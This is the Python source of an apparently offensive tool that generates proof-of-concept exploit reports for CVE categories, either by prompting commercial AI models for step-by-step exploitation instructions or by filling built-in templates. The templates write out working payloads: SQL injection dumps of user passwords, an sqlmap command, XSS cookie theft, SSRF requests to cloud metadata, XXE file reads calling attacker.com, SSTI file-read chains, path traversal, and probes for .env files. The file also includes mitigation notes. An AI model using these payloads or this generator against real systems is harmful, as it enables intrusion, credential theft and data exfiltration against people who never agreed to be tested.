# core/poc_generator.py
from typing import Dict, Optional, List
import requests
import json


class POCGenerator:
    
    def __init__(self, api_key: Optional[str] = None, api_provider: str = 'openai'):
        self.api_key = api_key
        self.api_provider = api_provider
        self.endpoints = {
            'openai': 'https://api.openai.com/v1/chat/completions',
            'anthropic': 'https://api.anthropic.com/v1/messages',
            'gemini': 'https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent'
        }
    
    def generate_poc(self, vuln_data: Dict, target_url: str = '') -> Dict:
        cve_data = self._enrich_cve_data(vuln_data)
        
        if self.api_key and self.api_provider in self.endpoints:
            return self._generate_with_ai(cve_data, target_url)
        else:
            return self._generate_smart_poc(cve_data, target_url)
    
    def _enrich_cve_data(self, vuln_data: Dict) -> Dict:
        from core.cve_payloads import CVEPayloads
        
        cve_id = vuln_data.get('id', '')
        
        all_cves = CVEPayloads.get_all_cves()
        original_cve = next((c for c in all_cves if c['id'] == cve_id), None)
        
        if original_cve:
            return {
                **vuln_data,
                'payloads': original_cve.get('payloads', []),
                'patterns': original_cve.get('patterns', [])
            }
        
        return {
            **vuln_data,
            'payloads': [],
            'patterns': []
        }
    
    def _generate_with_ai(self, cve_data: Dict, target_url: str) -> Dict:
        try:
            if self.api_provider == 'openai':
                return self._generate_with_openai(cve_data, target_url)
            elif self.api_provider == 'anthropic':
                return self._generate_with_anthropic(cve_data, target_url)
            elif self.api_provider == 'gemini':
                return self._generate_with_gemini(cve_data, target_url)
        except Exception:
            return self._generate_smart_poc(cve_data, target_url)
    
    def _generate_with_openai(self, cve_data: Dict, target_url: str) -> Dict:
        prompt = f"""Generate a detailed Proof of Concept (POC) for the following vulnerability:

CVE ID: {cve_data.get('id', 'N/A')}
Name: {cve_data.get('name', 'N/A')}
Severity: {cve_data.get('severity', 'N/A')} (Score: {cve_data.get('score', 0)})
Category: {cve_data.get('category', 'N/A')}
Description: {cve_data.get('description', 'N/A')}
Target URL: {target_url if target_url else 'https://target.example.com'}

Please provide:
1. A clear explanation of the vulnerability
2. Prerequisites and requirements
3. Step-by-step exploitation instructions
4. Example payloads and commands
5. Expected results
6. Mitigation recommendations

Format the response in a structured way with clear sections."""

        headers = {
            'Authorization': f'Bearer {self.api_key}',
            'Content-Type': 'application/json'
        }
        
        data = {
            'model': 'gpt-4',
            'messages': [
                {'role': 'system', 'content': 'You are a cybersecurity expert specialized in vulnerability analysis and POC generation.'},
                {'role': 'user', 'content': prompt}
            ],
            'temperature': 0.7,
            'max_tokens': 2000
        }
        
        try:
            response = requests.post(
                self.endpoints['openai'],
                headers=headers,
                json=data,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                poc_text = result['choices'][0]['message']['content']
                return self._parse_ai_response(poc_text, cve_data)
        except Exception:
            pass
        
        return self._generate_smart_poc(cve_data, target_url)
    
    def _generate_with_anthropic(self, cve_data: Dict, target_url: str) -> Dict:
        prompt = f"""Generate a detailed POC for {cve_data.get('id', 'N/A')} - {cve_data.get('name', 'N/A')}
Severity: {cve_data.get('severity', 'N/A')}
Description: {cve_data.get('description', 'N/A')}
Target: {target_url if target_url else 'https://target.example.com'}

Provide detailed exploitation steps and mitigation."""

        headers = {
            'x-api-key': self.api_key,
            'anthropic-version': '2023-06-01',
            'content-type': 'application/json'
        }
        
        data = {
            'model': 'claude-3-opus-20240229',
            'max_tokens': 2000,
            'messages': [
                {'role': 'user', 'content': prompt}
            ]
        }
        
        try:
            response = requests.post(
                self.endpoints['anthropic'],
                headers=headers,
                json=data,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                poc_text = result['content'][0]['text']
                return self._parse_ai_response(poc_text, cve_data)
        except Exception:
            pass
        
        return self._generate_smart_poc(cve_data, target_url)
    
    def _generate_with_gemini(self, cve_data: Dict, target_url: str) -> Dict:
        prompt = f"""Create a comprehensive POC for {cve_data.get('id', 'N/A')}.
Vulnerability: {cve_data.get('name', 'N/A')}
Severity: {cve_data.get('severity', 'N/A')} ({cve_data.get('score', 0)})
Description: {cve_data.get('description', 'N/A')}

Include exploitation steps and security recommendations."""

        url = f"{self.endpoints['gemini']}?key={self.api_key}"
        
        data = {
            'contents': [{
                'parts': [{'text': prompt}]
            }]
        }
        
        try:
            response = requests.post(url, json=data, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                poc_text = result['candidates'][0]['content']['parts'][0]['text']
                return self._parse_ai_response(poc_text, cve_data)
        except Exception:
            pass
        
        return self._generate_smart_poc(cve_data, target_url)
    
    def _parse_ai_response(self, text: str, cve_data: Dict) -> Dict:
        sections = {
            'overview': '',
            'prerequisites': '',
            'exploitation_steps': [],
            'payloads': [],
            'expected_results': '',
            'mitigation': '',
            'references': []
        }
        
        lines = text.split('\n')
        current_section = 'overview'
        step_counter = 1
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            line_lower = line.lower()
            
            if any(keyword in line_lower for keyword in ['prerequisite', 'requirement']):
                current_section = 'prerequisites'
            elif any(keyword in line_lower for keyword in ['step', 'exploitation', 'instruction']):
                current_section = 'exploitation_steps'
            elif any(keyword in line_lower for keyword in ['payload', 'command', 'code']):
                current_section = 'payloads'
            elif any(keyword in line_lower for keyword in ['result', 'output', 'response']):
                current_section = 'expected_results'
            elif any(keyword in line_lower for keyword in ['mitigation', 'remediation', 'fix']):
                current_section = 'mitigation'
            elif any(keyword in line_lower for keyword in ['reference', 'link', 'source']):
                current_section = 'references'
            else:
                if current_section == 'exploitation_steps':
                    if line.startswith(('1.', '2.', '3.', '-', '*', '•')):
                        sections['exploitation_steps'].append(line)
                    else:
                        sections['exploitation_steps'].append(f"{step_counter}. {line}")
                        step_counter += 1
                elif current_section == 'payloads':
                    if any(c in line for c in ['`', '"', "'"]):
                        sections['payloads'].append(line)
                elif current_section == 'references':
                    if 'http' in line:
                        sections['references'].append(line)
                else:
                    sections[current_section] += line + '\n'
        
        sections['cve_id'] = cve_data.get('id', 'N/A')
        sections['cve_name'] = cve_data.get('name', 'N/A')
        sections['severity'] = cve_data.get('severity', 'N/A')
        sections['score'] = cve_data.get('score', 0)
        sections['category'] = cve_data.get('category', 'N/A')
        
        return sections
    
    def _generate_smart_poc(self, cve_data: Dict, target_url: str) -> Dict:
        category = cve_data.get('category', 'RCE')
        
        poc_templates = {
            'RCE': self._generate_rce_poc,
            'SQLi': self._generate_sqli_poc,
            'XSS': self._generate_xss_poc,
            'SSRF': self._generate_ssrf_poc,
            'XXE': self._generate_xxe_poc,
            'SSTI': self._generate_ssti_poc,
            'PATH_TRAVERSAL': self._generate_path_traversal_poc,
            'DESERIALIZATION': self._generate_deserialization_poc,
            'LFI': self._generate_lfi_poc,
            'RFI': self._generate_rfi_poc,
            'COMMAND_INJECTION': self._generate_command_injection_poc,
            'NoSQLi': self._generate_nosqli_poc,
            'IDOR': self._generate_idor_poc,
            'CSRF': self._generate_csrf_poc,
            'INFO_DISCLOSURE': self._generate_info_disclosure_poc,
            'MISCONFIGURATION': self._generate_misconfiguration_poc,
            'DOS': self._generate_dos_poc,
            'PROTOTYPE_POLLUTION': self._generate_prototype_pollution_poc
        }
        
        generator = poc_templates.get(category, self._generate_generic_poc)
        return generator(cve_data, target_url)
    
    def _get_payloads_safe(self, cve_data: Dict) -> List[str]:
        payloads = cve_data.get('payloads', [])
        if not payloads:
            payloads = []
        return payloads[:3] if payloads else []
    
    def _generate_rce_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'UNKNOWN'),
            'score': cve_data.get('score', 0),
            'category': cve_data.get('category', 'RCE'),
            'overview': f"Remote Code Execution vulnerability in {cve_data.get('name', 'Target')}. This vulnerability allows attackers to execute arbitrary commands on the target system remotely.",
            'prerequisites': "- Network access to the target\n- Valid HTTP request capability\n- Understanding of the application architecture",
            'exploitation_steps': [
                "1. Identify the vulnerable endpoint or parameter",
                "2. Craft a malicious payload using known exploitation techniques",
                "3. Send the payload via GET/POST request to the target",
                "4. Verify command execution through response analysis",
                "5. Establish persistence or extract sensitive data"
            ],
            'payloads': [
                f"curl -X POST '{target}' -d 'cmd=id'",
                f"curl '{target}?exec=whoami'",
                f"curl -X POST '{target}' --data-binary @payload.txt"
            ] + payloads,
            'expected_results': "Successful execution will return command output in the HTTP response. Look for:\n- System user information (uid, gid)\n- Process listings\n- File system access\n- Network information",
            'mitigation': "- Input validation and sanitization\n- Implement whitelist-based command filtering\n- Use parameterized queries\n- Apply principle of least privilege\n- Regular security updates and patches\n- Web Application Firewall (WAF) deployment",
            'references': [
                cve_data.get('reference', ''),
                'https://owasp.org/www-community/attacks/Command_Injection',
                'https://cwe.mitre.org/data/definitions/78.html'
            ]
        }
    
    def _generate_sqli_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'HIGH'),
            'score': cve_data.get('score', 8),
            'category': cve_data.get('category', 'SQLi'),
            'overview': f"SQL Injection vulnerability in {cve_data.get('name', 'Target')}. Allows attackers to manipulate database queries and potentially extract sensitive data.",
            'prerequisites': "- HTTP request capability\n- Basic SQL knowledge\n- Access to the vulnerable parameter",
            'exploitation_steps': [
                "1. Identify injectable parameters (id, search, filter, etc.)",
                "2. Test for SQL injection using simple payloads (' OR '1'='1)",
                "3. Determine database type through error messages",
                "4. Extract database schema using UNION-based injection",
                "5. Dump sensitive data (users, passwords, tokens)",
                "6. Attempt privilege escalation or file system access"
            ],
            'payloads': [
                f"{target}?id=1' OR '1'='1",
                f"{target}?id=1' UNION SELECT NULL,username,password FROM users--",
                f"{target}?id=1' AND 1=2 UNION SELECT NULL,database(),user()--",
                f"sqlmap -u '{target}?id=1' --dbs --batch"
            ] + payloads,
            'expected_results': "- Database error messages revealing structure\n- Unauthorized data access\n- Full database dump\n- Administrative access",
            'mitigation': "- Use prepared statements/parameterized queries\n- Implement input validation\n- Apply least privilege principle for database accounts\n- Use ORM frameworks\n- Regular security audits\n- Deploy WAF with SQL injection rules",
            'references': [
                cve_data.get('reference', ''),
                'https://owasp.org/www-community/attacks/SQL_Injection',
                'https://portswigger.net/web-security/sql-injection'
            ]
        }
    
    def _generate_xss_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'MEDIUM'),
            'score': cve_data.get('score', 6),
            'category': cve_data.get('category', 'XSS'),
            'overview': f"Cross-Site Scripting (XSS) vulnerability in {cve_data.get('name', 'Target')}. Enables injection of malicious scripts into web pages.",
            'prerequisites': "- Browser access\n- JavaScript knowledge\n- Vulnerable input parameter",
            'exploitation_steps': [
                "1. Identify input fields or URL parameters",
                "2. Test with basic XSS payloads (<script>alert(1)</script>)",
                "3. Analyze response to determine if script executes",
                "4. Bypass any filters using encoding or obfuscation",
                "5. Craft advanced payload for cookie theft or session hijacking"
            ],
            'payloads': [
                f"{target}?search=<script>alert(document.cookie)</script>",
                f"{target}?name=<img src=x onerror=alert(1)>",
                f"{target}?input=<svg/onload=alert('XSS')>"
            ] + payloads,
            'expected_results': "- JavaScript execution in browser\n- Alert boxes or console output\n- Cookie/session theft\n- Redirection to malicious sites",
            'mitigation': "- Output encoding/escaping\n- Content Security Policy (CSP)\n- HTTPOnly cookies\n- Input validation\n- Use security headers\n- Framework-level XSS protection",
            'references': [
                cve_data.get('reference', ''),
                'https://owasp.org/www-community/attacks/xss/',
                'https://portswigger.net/web-security/cross-site-scripting'
            ]
        }
    
    def _generate_ssrf_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'HIGH'),
            'score': cve_data.get('score', 8),
            'category': cve_data.get('category', 'SSRF'),
            'overview': f"Server-Side Request Forgery (SSRF) in {cve_data.get('name', 'Target')}. Allows attackers to make requests from the server to internal resources.",
            'prerequisites': "- URL/file parameter access\n- Understanding of internal network topology",
            'exploitation_steps': [
                "1. Identify URL input parameters",
                "2. Test with internal IP addresses (127.0.0.1, 169.254.169.254)",
                "3. Attempt to access cloud metadata endpoints",
                "4. Scan internal network services",
                "5. Extract sensitive information from internal APIs"
            ],
            'payloads': [
                f"{target}?url=http://127.0.0.1:8080/admin",
                f"{target}?url=http://169.254.169.254/latest/meta-data/",
                f"{target}?file=file:///etc/passwd"
            ] + payloads,
            'expected_results': "- Access to internal services\n- Cloud metadata exposure\n- Internal network enumeration\n- Credential theft",
            'mitigation': "- Whitelist allowed domains/IPs\n- Validate and sanitize URL inputs\n- Disable unnecessary protocols\n- Network segmentation\n- Monitor outbound requests",
            'references': [
                cve_data.get('reference', ''),
                'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
                'https://portswigger.net/web-security/ssrf'
            ]
        }
    
    def _generate_xxe_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'HIGH'),
            'score': cve_data.get('score', 8),
            'category': cve_data.get('category', 'XXE'),
            'overview': f"XML External Entity (XXE) vulnerability in {cve_data.get('name', 'Target')}. Enables file disclosure and SSRF through XML parsing.",
            'prerequisites': "- XML input capability\n- Knowledge of XML entities\n- Target file paths",
            'exploitation_steps': [
                "1. Identify XML input endpoints",
                "2. Test for XXE with simple entity declaration",
                "3. Extract local files using file:// protocol",
                "4. Perform SSRF through http:// protocol",
                "5. Attempt blind XXE if no direct output"
            ],
            'payloads': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>'
            ] + payloads,
            'expected_results': "- File content disclosure\n- Internal network access\n- Denial of service\n- Remote code execution",
            'mitigation': "- Disable external entity processing\n- Use less complex data formats (JSON)\n- Input validation\n- Update XML parsers\n- Implement least privilege",
            'references': [
                cve_data.get('reference', ''),
                'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
                'https://portswigger.net/web-security/xxe'
            ]
        }
    
    def _generate_ssti_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'CRITICAL'),
            'score': cve_data.get('score', 9),
            'category': cve_data.get('category', 'SSTI'),
            'overview': f"Server-Side Template Injection (SSTI) in {cve_data.get('name', 'Target')}. Allows code execution through template engines.",
            'prerequisites': "- Template engine identification\n- Input parameter access\n- Understanding of template syntax",
            'exploitation_steps': [
                "1. Detect template engine (Jinja2, Twig, FreeMarker)",
                "2. Test with math expressions {{7*7}}",
                "3. Identify available objects and methods",
                "4. Craft RCE payload specific to template engine",
                "5. Execute system commands"
            ],
            'payloads': [
                f"{target}?name={{{{7*7}}}}",
                f"{target}?name={{{{config.items()}}}}",
                "{{''.__class__.__mro__[1].__subclasses__()[414]('/etc/passwd').read()}}"
            ] + payloads,
            'expected_results': "- Expression evaluation (49)\n- Object enumeration\n- File system access\n- Remote code execution",
            'mitigation': "- Use sandboxed template engines\n- Separate logic from presentation\n- Input validation\n- Disable dangerous functions\n- Regular updates",
            'references': [
                cve_data.get('reference', ''),
                'https://portswigger.net/research/server-side-template-injection',
                'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection'
            ]
        }
    
    def _generate_path_traversal_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'HIGH'),
            'score': cve_data.get('score', 8),
            'category': cve_data.get('category', 'PATH_TRAVERSAL'),
            'overview': f"Path Traversal vulnerability in {cve_data.get('name', 'Target')}. Enables unauthorized file system access.",
            'prerequisites': "- File parameter identification\n- Knowledge of target OS\n- Common file paths",
            'exploitation_steps': [
                "1. Identify file inclusion parameters",
                "2. Test with basic traversal (../../../etc/passwd)",
                "3. Try various encoding techniques",
                "4. Enumerate sensitive files",
                "5. Extract configuration and credentials"
            ],
            'payloads': [
                f"{target}?file=../../../../etc/passwd",
                f"{target}?path=..\\..\\..\\..\\windows\\win.ini",
                f"{target}?doc=....//....//....//etc/passwd"
            ] + payloads,
            'expected_results': "- Access to system files\n- Configuration disclosure\n- Source code exposure\n- Credential theft",
            'mitigation': "- Input validation with whitelist\n- Canonicalize file paths\n- Restrict file access\n- Use chroot/jails\n- Implement access controls",
            'references': [
                cve_data.get('reference', ''),
                'https://owasp.org/www-community/attacks/Path_Traversal',
                'https://portswigger.net/web-security/file-path-traversal'
            ]
        }
    
    def _generate_deserialization_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_rce_poc(cve_data, target_url)
    
    def _generate_lfi_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_path_traversal_poc(cve_data, target_url)
    
    def _generate_rfi_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_path_traversal_poc(cve_data, target_url)
    
    def _generate_command_injection_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_rce_poc(cve_data, target_url)
    
    def _generate_nosqli_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_sqli_poc(cve_data, target_url)
    
    def _generate_idor_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'MEDIUM'),
            'score': cve_data.get('score', 7),
            'category': cve_data.get('category', 'IDOR'),
            'overview': 'Insecure Direct Object Reference (IDOR) - Allows access to unauthorized resources by manipulating ID parameters.',
            'prerequisites': "- Multiple user accounts\n- Resource ID knowledge\n- Understanding of URL structure",
            'exploitation_steps': [
                "1. Identify resource IDs in URLs/API calls",
                "2. Note IDs for accessible resources",
                "3. Try sequential or predictable IDs",
                "4. Access unauthorized resources",
                "5. Extract sensitive information"
            ],
            'payloads': [
                f"{target}/api/user/1",
                f"{target}/api/user/2",
                f"{target}/api/user/999"
            ] + payloads,
            'expected_results': "- Unauthorized data access\n- User enumeration\n- Sensitive information disclosure",
            'mitigation': "- Implement proper authorization checks\n- Validate user permissions\n- Use non-sequential IDs\n- Implement access controls",
            'references': [
                'https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control'
            ]
        }
    
    def _generate_csrf_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'MEDIUM'),
            'score': cve_data.get('score', 6),
            'category': cve_data.get('category', 'CSRF'),
            'overview': 'Cross-Site Request Forgery (CSRF) - Allows attackers to perform unauthorized actions on behalf of users.',
            'prerequisites': "- User session access\n- Knowledge of target action\n- Attacker-controlled website",
            'exploitation_steps': [
                "1. Identify state-changing actions",
                "2. Verify no CSRF token validation",
                "3. Create malicious page with hidden form",
                "4. Trick user into visiting malicious page",
                "5. Action executes with user permissions"
            ],
            'payloads': ['<img src="https://target.com/api/transfer?amount=1000">'],
            'expected_results': "- Unauthorized state changes\n- Data modification\n- Account compromise",
            'mitigation': "- Implement CSRF tokens\n- Use SameSite cookies\n- Verify referer headers\n- Require re-authentication",
            'references': [
                'https://owasp.org/www-community/attacks/csrf'
            ]
        }
    
    def _generate_info_disclosure_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'MEDIUM'),
            'score': cve_data.get('score', 5),
            'category': cve_data.get('category', 'INFO_DISCLOSURE'),
            'overview': 'Information Disclosure vulnerability exposing sensitive system or application information.',
            'prerequisites': "- Network access\n- Vulnerability knowledge",
            'exploitation_steps': [
                "1. Identify information disclosure vectors",
                "2. Send probing requests",
                "3. Analyze responses for sensitive data",
                "4. Extract and document findings"
            ],
            'payloads': [
                f"{target}/admin",
                f"{target}/.git/config",
                f"{target}/.env"
            ] + payloads,
            'expected_results': "- Version information\n- Configuration files\n- Source code exposure\n- Credentials",
            'mitigation': "- Disable verbose error messages\n- Restrict directory access\n- Hide sensitive files\n- Implement proper access controls",
            'references': [
                'https://owasp.org/www-project-top-ten/'
            ]
        }
    
    def _generate_misconfiguration_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_info_disclosure_poc(cve_data, target_url)
    
    def _generate_dos_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'MEDIUM'),
            'score': cve_data.get('score', 5),
            'category': cve_data.get('category', 'DOS'),
            'overview': 'Denial of Service vulnerability allowing attackers to disrupt service availability.',
            'prerequisites': "- Network access\n- Resource consumption capability",
            'exploitation_steps': [
                "1. Identify DoS vectors",
                "2. Prepare attack payload",
                "3. Send malicious requests",
                "4. Monitor service availability"
            ],
            'payloads': ['Highly resource-intensive requests'],
            'expected_results': "- Service unavailability\n- Resource exhaustion\n- Performance degradation",
            'mitigation': "- Rate limiting\n- Input validation\n- Resource limits\n- Load balancing",
            'references': [
                'https://owasp.org/www-community/attacks/DoS'
            ]
        }
    
    def _generate_prototype_pollution_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_rce_poc(cve_data, target_url)
    
    def _generate_generic_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        payloads = self._get_payloads_safe(cve_data)
        
        return {
            'cve_id': cve_data.get('id', 'N/A'),
            'cve_name': cve_data.get('name', 'N/A'),
            'severity': cve_data.get('severity', 'UNKNOWN'),
            'score': cve_data.get('score', 0),
            'category': cve_data.get('category', 'GENERIC'),
            'overview': f"Security vulnerability in {cve_data.get('name', 'Target')}. {cve_data.get('description', 'A security vulnerability has been identified.')}",
            'prerequisites': "- Network access to target\n- Basic understanding of web security\n- Testing tools (curl, burp suite)",
            'exploitation_steps': [
                "1. Identify the vulnerable component",
                "2. Gather information about the target system",
                "3. Prepare exploitation payload",
                "4. Execute the attack",
                "5. Verify successful exploitation"
            ],
            'payloads': payloads if payloads else [f"{target}?payload=test"],
            'expected_results': "Successful exploitation will demonstrate the vulnerability impact.",
            'mitigation': "- Apply vendor patches immediately\n- Implement input validation\n- Follow security best practices\n- Regular security assessments",
            'references': [cve_data.get('reference', '')]
        }
